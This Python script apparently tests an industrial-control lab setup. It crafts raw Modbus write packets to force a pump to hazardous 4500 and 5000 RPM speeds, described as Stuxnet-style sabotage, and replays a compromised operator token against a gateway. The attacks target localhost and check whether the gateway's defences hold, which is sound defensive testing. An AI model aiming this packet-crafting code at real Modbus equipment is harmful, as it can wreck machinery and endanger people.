"""
Adversary Attack Suite (ICS / Modbus Exploitation)
Demonstrates three industrial attack vectors:
1. Direct Unauthenticated Manipulation (Bypassing Perimeter / MITM).
2. Malicious Over-Speed Injection (Stuxnet-style physical sabotage, requesting 5000 RPM).
3. Privilege Escalation / Unauthorized Coil Trip via unauthorized token.
"""

import socket
import struct
import time
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s [ATTACKER] %(message)s")
logger = logging.getLogger("Adversary")

def attack_direct_unauthenticated(target_host="127.0.0.1", target_port=5020):
    logger.warning("=" * 60)
    logger.warning("[SCENARIO 1] Direct Attack against unprotected Modbus Slave port 5020")
    logger.warning("=" * 60)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        
        # Craft rogue write single register (0x06): Force RPM to 4500 (Overspeed sabotage)
        pdu = struct.pack(">B HH", 0x06, 0, 4500)
        mbap = struct.pack(">HHHB", 999, 0, len(pdu) + 1, 1)
        
        logger.warning("Sending malicious Modbus write packet: Setting Pump Speed = 4500 RPM...")
        s.sendall(mbap + pdu)
        resp = s.recv(1024)
        if resp and resp[7] == 0x06:
            logger.error(">>> EXPLOIT SUCCESSFUL: Unprotected pump accepted rogue 4500 RPM command!")
        s.close()
    except Exception as e:
        logger.error(f"Attack failed or connection refused: {e}")

def attack_via_gateway_invalid_token(gw_host="127.0.0.1", gw_port=5021):
    logger.warning("=" * 60)
    logger.warning("[SCENARIO 2] Gateway Defense: Attempting unauthenticated access via Gateway")
    logger.warning("=" * 60)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((gw_host, gw_port))
        s.sendall(b"ROGUE-ATTACKER-TOKEN\n")
        resp = s.recv(64).decode(errors="ignore").strip()
        logger.info(f"Gateway Response: {resp}")
        if "ERROR" in resp or "DENIED" in resp:
            logger.info(">>> DEFENSE VERIFIED: Gateway dropped unauthenticated attacker connection.")
        s.close()
    except Exception as e:
        logger.error(f"Error: {e}")

def attack_overspeed_through_gateway(gw_host="127.0.0.1", gw_port=5021):
    logger.warning("=" * 60)
    logger.warning("[SCENARIO 3] Gateway DPI Defense: Submitting Hazardous 5000 RPM Parameter via Compromised Operator Token")
    logger.warning("=" * 60)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((gw_host, gw_port))
        
        # Valid operator token used maliciously
        s.sendall(b"OPERATOR-SEC-TOKEN-42\n")
        auth_resp = s.recv(64).decode().strip()
        logger.info(f"Token Authentication: {auth_resp}")
        
        # Malicious PDU: Write 5000 RPM to Register 0
        pdu = struct.pack(">B HH", 0x06, 0, 5000)
        mbap = struct.pack(">HHHB", 1001, 0, len(pdu) + 1, 1)
        
        logger.warning("Sending 5000 RPM Over-speed payload through Gateway...")
        s.sendall(mbap + pdu)
        
        resp_mbap = s.recv(7)
        if resp_mbap:
            _, _, r_len, _ = struct.unpack(">HHHB", resp_mbap)
            resp_pdu = s.recv(r_len - 1)
            if resp_pdu[0] & 0x80:
                logger.info(f">>> DEFENSE VERIFIED: Gateway Deep Packet Inspection intercepted hazardous payload! Exception 0x{resp_pdu[1]:02x}")
            else:
                logger.error(">>> FAILURE: Gateway failed to intercept hazardous parameter!")
        s.close()
    except Exception as e:
        logger.error(f"Error: {e}")

if __name__ == "__main__":
    attack_direct_unauthenticated()
    time.sleep(1)
    attack_via_gateway_invalid_token()
    time.sleep(1)
    attack_overspeed_through_gateway()
